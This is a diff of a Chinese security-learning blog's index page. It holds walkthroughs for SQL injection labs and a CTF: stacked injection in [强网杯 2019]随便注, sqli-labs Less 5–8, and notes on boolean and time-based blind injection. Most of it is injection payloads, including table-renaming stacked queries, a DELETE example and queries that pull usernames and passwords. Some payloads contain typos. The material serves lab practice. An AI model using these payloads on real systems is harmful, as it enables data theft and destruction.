+        <h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>mysql数据库sql语句的默认结尾是以 <strong>;</strong> 结尾，在执行多条sql语句时要使用结束符隔开，那么在 <strong>；</strong>结束一条sql语句后继续构造下一条语句会不会一起执行？因此这个想法就造成了堆叠注入。</p>
+<p>而union injection(联合注入)也是将两条语句合并在一起，两者有什么区别嘛？</p>
+<p>区别就在于union或者union all 执行的语句类型有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
+<pre><code>用户输入：1; DELETE FROM products
+服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products
+当执行查询后，第一条显示查询信息，第二条则将整个表进行删除
+</code></pre>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1.先判断注入类型</p>
+<pre><code>1
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202114862.png" alt="image-20230516202114862"></p>
+<p>正常显示，再试试别的</p>
+<pre><code>1&#39;
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202210837.png" alt="image-20230516202210837"></p>
+<p>出现错误，说明存在注入，看一下报错信息，没有显示有用的信息，在试试万能注入</p>
+<pre><code>1&#39; or 1=1;#
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202509807.png" alt="image-20230516202509807"></p>
+<p>2.可以判断一下字段数</p>
+<pre><code>1&#39; order by 3#    
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516203725859.png" alt="image-20230516203725859"></p>
+<pre><code>1&#39; order by 2#
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204018371.png" alt="image-20230516204018371"></p>
+<p>说明字段数为2</p>
+<p>然后我们尝试一下用联合注入看一下</p>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204230761.png" alt="image-20230516204230761"></p>
+<p>perg_math函数是正则函数，从报错信息我们发现select被正则匹配过滤掉了</p>
+<p>我们再试试别的方法</p>
+<p>3.查看数据库</p>
+<pre><code>1&#39;;show databases;#
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516205244193.png" alt="image-20230516205244193"></p>
+<p>执行上面的语句，我们发现第一句满足条件的语句之后，还能在执行下一条，没有条件限制</p>
+<p>4.查看表名</p>
+<pre><code>1&#39;;show tables from supersqli;#
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210127648.png" alt="image-20230516210127648"></p>
+<p><strong>注意：如果查看的表名是字符串，就需要加上反引号(`),英文输入法下按esc下面那个键</strong></p>
+<p>查看字符串表中的数据</p>
+<pre><code>1&#39;;use supersqli;show columns from `1919810931114514`;#
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210857498.png" alt="image-20230516210857498"></p>
+<p>再查看words表看看</p>
+<pre><code>1&#39;;use supersqli;show columns from words;#
+</code></pre>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516211257044.png" alt="image-20230516211257044"></p>
+<p>varchar()是一种比char灵活的数据类型，是可以保存可变长的字符串</p>
+<p>根据两个表的情况结合实际查询出结果,判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构也是id（数字）和data（字符串），查询传入参数也就是赋值给了id</p>
+<h2 id="rename和alert用法"><a href="#rename和alert用法" class="headerlink" title="rename和alert用法"></a>rename和alert用法</h2><p>rename：修改一个或者多个表的名称</p>
+<pre><code>rename table old_table_name to new_table_name;
+</code></pre>
+<p>alter :向表中添加字段</p>
+<pre><code>alter table [表名] add [列名] 类型
+</code></pre>
+<p>保留old和new列名</p>
+<pre><code>列名：a ----&gt;b 列类型
+     alter table t1 change a b integer;
+</code></pre>
+<p>改名</p>
+<pre><code>1&#39;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);show tables;#
+</code></pre>
+<p>更改表名列名</p>
+<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
+<p>2，把 1919810931114514 表的名字改为 words 。</p>
+<p>3 ，给新 words 表添加新的列名 id 。</p>
+<p>4，将 flag 改名为 data 。</p>
+<p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214010853.png" alt="image-20230516214010853"></p>
+<p>最后用</p>
+<pre><code>1&#39; and 1=1#
+</code></pre>
+<p>看回显数据</p>
+<p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214204616.png" alt="image-20230516214204616"></p>
+<p>得到flag</p>
+<p>这个大佬的wp不错！！！</p>
+<p><a target="_blank" rel="noopener" href="https://ttoc.fun/2022/06/21/buuctf-wp/">https://ttoc.fun/2022/06/21/buuctf-wp/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" data-id="cljwyeabh000dy0vg2opzes3s" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
 
-2.可以判断一下字段数
-11&#x27; order by 3#    
+  
+    <article id="post-sql-labs靶场less8" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/" class="article-date">
+  <time datetime="2023-05-15T01:59:31.000Z" itemprop="datePublished">2023-05-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/">sql-labs靶场less8(盲注)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>bool盲注常用的函数</p>
+<pre><code>database()   显示数据库名称
+left(a,b)    从左侧截取a的前b位
+substr(a,b,c) 从b位置开始，截取字符串a到c的长度
+mid(a,b,c)  从b位置开始，截取a字符串的c位
+length()    返回字符串长度
+ascii()      将某个字符转换成ascii值
+char()       将ascii码转换为对应的字符
+</code></pre>
+<p>打开源码看了一下</p>
+<p>这道题可以使用时间盲注，不能使用报错注入，因为报错的信息被注释掉了</p>
+<p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515103641066.png" alt="image-20230515103641066"></p>
+<p>1.判断注入点</p>
+<pre><code>?id=1   页面正常，但是没有显示消息
+</code></pre>
+<p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515105031032.png" alt="image-20230515105031032"></p>
+<p>加单引号</p>
+<p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515105151868.png" alt="image-20230515105151868"></p>
+<p>页面无回显，应该是报错了</p>
+<p>继续试试</p>
+<pre><code>?id=1 and 1=1
+?id=1 and 1=2 页面都正常，说明不是数字型注入，
+?id=1&#39; and 1=1 --+  页面正常，可以正常的显示
+    真      真    真
+?id=1&#39; and 1=2 --+
+   真       假    假
+页面发生变化(没有报错，只是查不出来数据，和上面的无回显不一样)，说明是单引号闭合的字符型注入。
+</code></pre>
+<p>1.查看数据库版本</p>
+<pre><code>?id=1&#39; and left(version(),1)=5 %23
+</code></pre>
+<p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515112258415.png" alt="image-20230515112258415"></p>
+<p>这个数据库的版本为5.7.42 ，上面的语句是看版本号的第一位是不是5，如果回显正常，那么说明第一位就是5</p>
+<p>上图显示正常，剩下的慢慢测，一般使用脚本。</p>
+<p>2.猜解数据库的长度</p>
+<pre><code>?id=1&#39; and length(database(),1)&gt;&#39;a&#39; --+
+</code></pre>
+<p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515114347238.png" alt="image-20230515114347238"></p>
+<p>数据库长度为 8 时，页面回显正常。这里说明下，长度要一个一个的试，这里只是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。</p>
+<p>3.猜数据库名字</p>
+<pre><code>?id=1&#39; and left(databse(),1)&gt;&#39;a&#39; --+
+</code></pre>
+<p><code>left(a,b)</code>：返回a字符串从左至b位数，详细看下面用法</p>
+<p>4.猜表名</p>
+<pre><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+
+</code></pre>
+<p>5.猜字段名</p>
+<pre><code>?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+
+</code></pre>
+<p>6.猜数据</p>
+<p>用户名</p>
+<pre><code>?id=1&#39; and left((select username from users limit x,1),y)=&quot;&quot;--+
+</code></pre>
+<p>通过变换x，y的值可以得到所有的用户名 。</p>
+<p>密码</p>
+<pre><code>?id=1&#39; and left((select password from users limit x,1),y)=&quot;&quot;--+
+</code></pre>
+<p>通过变换 x，y 的值可以得到所有的密码 。</p>
+<p>通过布尔盲注手工注入比较繁琐，可以用脚本。</p>
+<p>下面分享脚本</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/" data-id="cljwyeabd0007y0vgbhrn18x3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
 
-11&# ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/" title="sql-labs靶场less8(盲注)">sql-labs靶场less8(盲注)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-15T01:59:31.000Z" title="Created 2023-05-15 09:59:31">2023-05-15</time></span></div><div class="content">bool盲注常用的函数
-1234567database()   显示数据库名称left(a,b)    从左侧截取a的前b位substr(a,b,c) 从b位置开始，截取字符串a到c的长度mid(a,b,c)  从b位置开始，截取a字符串的c位length()    返回字符串长度ascii()      将某个字符转换成ascii值char()       将ascii码转换为对应的字符
+  
+    <article id="post-sql-labs靶场less7" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless7/" class="article-date">
+  <time datetime="2023-05-15T01:20:44.000Z" itemprop="datePublished">2023-05-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless7/">sql-labs靶场less7</a>
+    </h1>
+  
 
-打开源码看了一下
-这道题可以使用时间盲注，不能使用报错注入，因为报错的信息被注释掉了
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开题目</p>
+<p>1.判断是否是数字型传参</p>
+<p>2.判断是否有单引号闭合</p>
+<p>3.判断是否有双引号闭合</p>
+<p>4.判断是否单引号+括号闭合</p>
+<p>5.判断是否是双引号+括号闭合</p>
+<p>如果以上都不是，那以上规则都同时加上sleep测试一遍，看是不是存在延时注入</p>
 
-1.判断注入点
-1?id=1   页面正常，但是没有显示消息
-
-
-加单引号
-
-页面无回显，应该是报错了
-继续试试
-1234567?id=1 and 1=1?id=1 and 1=2 页面都正常，说明不是数字型注入，?id=1&#x27; and 1=1 --+  页面正常，可以正常的显示    真      真    真?id=1&#x27; and 1=2 --+   真       假    假页面发生变化(没有报错，只是查不出来数据，和上面的无回显不一样)，说明是单引号闭合的字符型注入。
-
-1.查看数据库 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless7/" title="sql-labs靶场less7">sql-labs靶场less7</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-15T01:20:44.000Z" title="Created 2023-05-15 09:20:44">2023-05-15</time></span></div><div class="content">打开题目
-1.判断是否是数字型传参
-2.判断是否有单引号闭合
-3.判断是否有双引号闭合
-4.判断是否单引号+括号闭合
-5.判断是否是双引号+括号闭合
-如果以上都不是，那以上规则都同时加上sleep测试一遍，看是不是存在延时注入
-</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" title="布尔盲注和时间盲注">布尔盲注和时间盲注</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-14T02:48:47.000Z" title="Created 2023-05-14 10:48:47">2023-05-14</time></span></div><div class="content">什么是盲注盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站方法代码的限制或者apache等解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个判断过程称为盲注。
-简单理解就是在前端页面没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的，这个时候我们需要使用页面的正常和不正常显示来进行sql注入。
-盲注的分类布尔盲注
-时间盲注
-利用盲注的前提条件首先页面没有显示位（如果有显示位可以选择union联合查询），并且没有返回sql语句的执行错误信息。
-盲注的优缺点优点：不需要显示位和出错信息。
-缺点：速度慢，耗费时间长（可以使用bp等工具）
-布尔类型的盲注
-left(database(),1)&gt;’s’     //left() 函数
-
-database()显示数据库名称，left(a,b)从左侧截取a的前b位
-
- ascii(substr((select table_name information_schema.tables where tables_schema=d ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/" title="sql-labs靶场less6">sql-labs靶场less6</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-14T01:56:33.000Z" title="Created 2023-05-14 09:56:33">2023-05-14</time></span></div><div class="content">1.判断注入点（双引号注入）
-1?id=1&quot; and 1 --a   页面显示正常
-
-
-1?id=1&quot; and 0 -- a   页面异常（空显示）
-
-
-2.判断字符长度
-判断当前使用的数据库长度是否大于1
-1?id=1&quot; and length(database())=8 --+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless7/" data-id="cljwyeabc0006y0vg8p8he7k6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
 
-3.穷举字符
-判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入
-1?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a
+  
+    <article id="post-布尔盲注和时间盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time datetime="2023-05-14T02:48:47.000Z" itemprop="datePublished">2023-05-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">布尔盲注和时间盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="什么是盲注"><a href="#什么是盲注" class="headerlink" title="什么是盲注"></a>什么是盲注</h2><p>盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站方法代码的限制或者apache等解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个判断过程称为盲注。</p>
+<p>简单理解就是在前端页面没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的，这个时候我们需要使用页面的正常和不正常显示来进行sql注入。</p>
+<h2 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h2><p>布尔盲注</p>
+<p>时间盲注</p>
+<h2 id="利用盲注的前提条件"><a href="#利用盲注的前提条件" class="headerlink" title="利用盲注的前提条件"></a>利用盲注的前提条件</h2><p>首先页面没有显示位（如果有显示位可以选择union联合查询），并且没有返回sql语句的执行错误信息。</p>
+<h2 id="盲注的优缺点"><a href="#盲注的优缺点" class="headerlink" title="盲注的优缺点"></a>盲注的优缺点</h2><p>优点：不需要显示位和出错信息。</p>
+<p>缺点：速度慢，耗费时间长（可以使用bp等工具）</p>
+<h2 id="布尔类型的盲注"><a href="#布尔类型的盲注" class="headerlink" title="布尔类型的盲注"></a>布尔类型的盲注</h2><ol>
+<li>left(database(),1)&gt;’s’     //left() 函数</li>
+</ol>
+<p>database()显示数据库名称，left(a,b)从左侧截取a的前b位</p>
+<ol start="2">
+<li> ascii(substr((select table_name information_schema.tables where tables_schema=database() limit 0,1 ),1,1))=101 –+          //substr()函数，ascii函数()</li>
+</ol>
+<p>   substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值</p>
+<ol start="3">
+<li><p>ascii(substr((select database()),1,1))=98</p>
+</li>
+<li><p>ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&gt;98%23           //ord()函数，mid()函数</p>
+<p>mid(a,b,c)从位置b开始，截取a字符串的c位</p>
+<p>ord()函数同ascii(),将字符转为ascii值</p>
+</li>
+<li><p>regexp正则注入</p>
+<p>用法介绍：select user() regexp ‘^[a-z]’;</p>
+<p>正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’ 来进行。</p>
+<p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514160206799.png" alt="image-20230514160206799"></p>
+</li>
+</ol>
+<p>当正确的时候显示结果为1，不正确的时候显示结果为0</p>
+<p>6.like匹配注入</p>
+<p>和上述的正则类似，mysql在匹配的时候我们可以用like 进行匹配。</p>
+<p>用法：select user()  like ‘ro%’</p>
+<p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514163811743.png" alt="image-20230514163811743"></p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5)%23)    //if判断语句，条件为假，条件为假，执行sleep</p>
+<p>union select if(substring(current,1,1)=char(119),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null)  </p>
+<p>from (select database() as current) as tbl;</p>
+<p>//benchmark(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的CPU资源。</p>
+<p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514173225035.png" alt="image-20230514173225035"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cljwyeabl000fy0vg5eo371cj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sql-labs靶场less5" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/" class="article-date">
+  <time datetime="2023-05-14T01:56:33.000Z" itemprop="datePublished">2023-05-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/">sql-labs靶场less6</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.判断注入点（双引号注入）</p>
+<pre><code>?id=1&quot; and 1 --a   页面显示正常
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514203911904.png" alt="image-20230514203911904"></p>
+<pre><code>?id=1&quot; and 0 -- a   页面异常（空显示）
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514205048775.png" alt="image-20230514205048775"></p>
+<p>2.判断字符长度</p>
+<p>判断当前使用的数据库长度是否大于1</p>
+<pre><code>?id=1&quot; and length(database())=8 --+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514221524192.png" alt="image-20230514221524192"></p>
+<p>3.穷举字符</p>
+<p>判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入</p>
+<pre><code>?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a
+</code></pre>
+<pre><code>?id=1&quot; and left(database(),1)=&#39;s&#39; --+
+
+用穷举的方法一个个列出来，....效率有点慢了
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514222128909.png" alt="image-20230514222128909"></p>
+<pre><code>?id=1&quot; and left(database(),8)=&#39;security&#39; --+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514225957158.png" alt="image-20230514225957158"></p>
+<p>4.判断库中每个表名的长度</p>
+<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6--+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514232750125.png" alt="image-20230514232750125"></p>
+<p>第一个表的长度是6</p>
+<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) = 8--+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514232933832.png" alt="image-20230514232933832"></p>
+<p>第二个表的长度为8</p>
+<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) = 7--+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233146882.png" alt="image-20230514233146882"></p>
+<p>第三个表的长度为7</p>
+<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 5--+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233314642.png" alt="image-20230514233314642"></p>
+<p>第四个表的长度为5</p>
+<p>5.爆破表名</p>
+<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 --+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233558822.png" alt="image-20230514233558822"></p>
+<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233732069.png" alt="image-20230514233732069"></p>
+<p>查看ascii表101是e，第一个表开头字母是e</p>
+<p>…..此处省略一些步骤</p>
+<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115 --+
+</code></pre>
+<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514234142010.png" alt="image-20230514234142010"></p>
+<p>查看ascii表115是u，第一个表开头字母是u</p>
+<p>….表名是users</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/" data-id="cljwyeabc0005y0vg8a7dc5sb" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页 &amp;raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">六月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/22/1.%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%92%8C%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/">upload-labs靶场</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/">宽字节注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 aurora<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
 
-123?id=1&quot; and left(database(),1)=&#x27;s&#x27; --+用穷举的方法一个个列出来，....效率有点慢了
+
+<script src="/js/script.js"></script>
 
 
-1?id=1&quot; and left(database(),8)=&#x27;security&#x27; --+
 
 
-4.判断库中每个表名的长度
-1?id=1&quot; and length((select table_name from information_schema.tables w ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/" title="sql-labs靶场less4">sql-labs靶场less4</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-13T15:43:53.000Z" title="Created 2023-05-13 23:43:53">2023-05-13</time></span></div><div class="content">在复习一下less4
-less-3是单引号+右括号，less-4是双引号+右括号
-1.判断注入点
-一开始，？id=1 直接回显用户名和密码，
-​              ？id=1’ 也是直接回显用户名和密码
-
-在尝试一下别的符号
-?id=1”  出现报错信息
-
-错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。
-2.查字段名
-输入
-1?id=1&quot;) order by 4 --+
-
-后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列
-
-3.查输出列的位置
-1?id=-1&quot;) union select 1,2,3 --+
-
-
-4.查看当前数据库和版本
-1?id=-1&quot;) union select 1,database(),version() --+
-
-
-5.查看当前数据库下的表
-1?id=-1&quot;) union select 1,group_concat(table_name),3 from inform ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/" title="sql-labs靶场less3">sql-labs靶场less3</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-13T12:31:35.000Z" title="Created 2023-05-13 20:31:35">2023-05-13</time></span></div><div class="content">今天浅浅复习一下
-1.判断注入点，
-输入？id=1 显示正常 
